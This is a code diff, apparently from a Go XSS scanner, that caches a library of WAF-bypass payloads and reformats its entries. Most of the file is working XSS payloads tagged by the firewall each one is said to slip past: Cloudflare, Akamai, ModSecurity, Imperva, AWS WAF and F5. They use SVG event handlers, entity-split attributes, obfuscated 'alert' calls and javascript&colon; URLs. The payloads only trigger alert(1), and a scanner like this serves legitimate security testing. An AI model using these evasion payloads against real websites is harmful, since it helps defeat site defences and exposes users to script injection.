@@ -29,7 +29,14 @@ func WAFTargetedPayloads(wafName string) []PayloadTemplate {
 
 // AllWAFBypassPayloads returns all WAF-bypass payloads regardless of WAF type.
 // Useful when the WAF type is unknown but WAF bypass is enabled.
+// Returns the cached list (read-only) built once at init.
 func AllWAFBypassPayloads() []PayloadTemplate {
+	return allWAFBypass
+}
+
+var allWAFBypass = buildAllWAFBypass()
+
+func buildAllWAFBypass() []PayloadTemplate {
 	var payloads []PayloadTemplate
 	payloads = append(payloads, cloudflareBypass()...)
 	payloads = append(payloads, akamaiBypass()...)
@@ -44,32 +51,32 @@ func cloudflareBypass() []PayloadTemplate {
 	return []PayloadTemplate{
 		// Cloudflare often misses SVG animate elements
 		{
-			Value:        `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "Cloudflare bypass: SVG animate onbegin",
+			Value:         `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "Cloudflare bypass: SVG animate onbegin",
 			WAFBypassOnly: true,
 		},
 		{
-			Value:        `<svg><set onbegin=alert(1) attributename=x to=1>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "Cloudflare bypass: SVG set onbegin",
+			Value:         `<svg><set onbegin=alert(1) attributename=x to=1>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "Cloudflare bypass: SVG set onbegin",
 			WAFBypassOnly: true,
 		},
 		// HTML entity insertion between tag and event handler
 		{
-			Value:        `<img src=x &#x09;onerror=alert(1)>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "Cloudflare bypass: HTML tab entity before onerror",
+			Value:         `<img src=x &#x09;onerror=alert(1)>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "Cloudflare bypass: HTML tab entity before onerror",
 			WAFBypassOnly: true,
 		},
 		{
-			Value:        `<img src=x &#x0a;onerror=alert(1)>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "Cloudflare bypass: HTML newline entity before onerror",
+			Value:         `<img src=x &#x0a;onerror=alert(1)>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "Cloudflare bypass: HTML newline entity before onerror",
 			WAFBypassOnly: true,
 		},
 	}
@@ -79,24 +86,24 @@ func akamaiBypass() []PayloadTemplate {
 	return []PayloadTemplate{
 		// Akamai often misses non-standard event handlers
 		{
-			Value:        `<details open ontoggle=alert(1)>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "Akamai bypass: details ontoggle",
+			Value:         `<details open ontoggle=alert(1)>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "Akamai bypass: details ontoggle",
 			WAFBypassOnly: true,
 		},
 		{
-			Value:        `<marquee onstart=alert(1)>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "Akamai bypass: marquee onstart",
+			Value:         `<marquee onstart=alert(1)>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "Akamai bypass: marquee onstart",
 			WAFBypassOnly: true,
 		},
 		{
-			Value:        `<marquee loop=1 width=0 onfinish=alert(1)>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "Akamai bypass: marquee onfinish",
+			Value:         `<marquee loop=1 width=0 onfinish=alert(1)>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "Akamai bypass: marquee onfinish",
 			WAFBypassOnly: true,
 		},
 	}
@@ -106,25 +113,25 @@ func modsecurityBypass() []PayloadTemplate {
 	return []PayloadTemplate{
 		// ModSecurity often misses bracket notation
 		{
-			Value:        `<img src=x onerror=window['alert'](1)>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "ModSecurity bypass: bracket notation for alert",
+			Value:         `<img src=x onerror=window['alert'](1)>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "ModSecurity bypass: bracket notation for alert",
 			WAFBypassOnly: true,
 		},
 		{
-			Value:        `<img src=x onerror=self['ale'+'rt'](1)>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "ModSecurity bypass: string concatenation",
+			Value:         `<img src=x onerror=self['ale'+'rt'](1)>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "ModSecurity bypass: string concatenation",
 			WAFBypassOnly: true,
 		},
 		// Backtick template literal in attribute
 		{
-			Value:        `<img src=x onerror=eval.call`+"``"+`alert(1)`+"``"+`>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "ModSecurity bypass: eval.call with backtick",
+			Value:         `<img src=x onerror=eval.call` + "``" + `alert(1)` + "``" + `>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "ModSecurity bypass: eval.call with backtick",
 			WAFBypassOnly: true,
 		},
 	}
@@ -134,17 +141,17 @@ func impervaBypass() []PayloadTemplate {
 	return []PayloadTemplate{
 		// Imperva often misses HTML entities in protocol handlers
 		{
-			Value:        `<a href=javascript&colon;alert(1)>click</a>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "Imperva bypass: &colon; entity in javascript: protocol",
+			Value:         `<a href=javascript&colon;alert(1)>click</a>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "Imperva bypass: &colon; entity in javascript: protocol",
 			WAFBypassOnly: true,
 		},
 		{
-			Value:        `<iframe src=javascript&colon;alert(1)>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "Imperva bypass: iframe with &colon; entity",
+			Value:         `<iframe src=javascript&colon;alert(1)>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "Imperva bypass: iframe with &colon; entity",
 			WAFBypassOnly: true,
 		},
 	}
@@ -154,25 +161,25 @@ func awsBypass() []PayloadTemplate {
 	return []PayloadTemplate{
 		// AWS WAF often misses SVG events
 		{
-			Value:        `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "AWS WAF bypass: SVG animate",
+			Value:         `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "AWS WAF bypass: SVG animate",
 			WAFBypassOnly: true,
 		},
 		{
-			Value:        `<svg><animateMotion onbegin=alert(1) dur=1s>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "AWS WAF bypass: SVG animateMotion",
+			Value:         `<svg><animateMotion onbegin=alert(1) dur=1s>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "AWS WAF bypass: SVG animateMotion",
 			WAFBypassOnly: true,
 		},
 		// Data attribute XSS
 		{
-			Value:        `<div data-x="x" onclick="alert(1)">click</div>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.Medium,
-			Desc:         "AWS WAF bypass: div with onclick",
+			Value:         `<div data-x="x" onclick="alert(1)">click</div>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.Medium,
+			Desc:          "AWS WAF bypass: div with onclick",
 			WAFBypassOnly: true,
 		},
 	}
@@ -182,17 +189,17 @@ func f5Bypass() []PayloadTemplate {
 	return []PayloadTemplate{
 		// F5 BIG-IP often misses certain encoding tricks
 		{
-			Value:        `<img src=x onerror=top['alert'](1)>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "F5 bypass: top['alert'] notation",
+			Value:         `<img src=x onerror=top['alert'](1)>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "F5 bypass: top['alert'] notation",
 			WAFBypassOnly: true,
 		},
 		{
-			Value:        `<body onpageshow=alert(1)>`,
-			Context:      context.ContextHTMLBody,
-			Severity:     model.High,
-			Desc:         "F5 bypass: body onpageshow",
+			Value:         `<body onpageshow=alert(1)>`,
+			Context:       context.ContextHTMLBody,
+			Severity:      model.High,
+			Desc:          "F5 bypass: body onpageshow",
 			WAFBypassOnly: true,
 		},
 	}
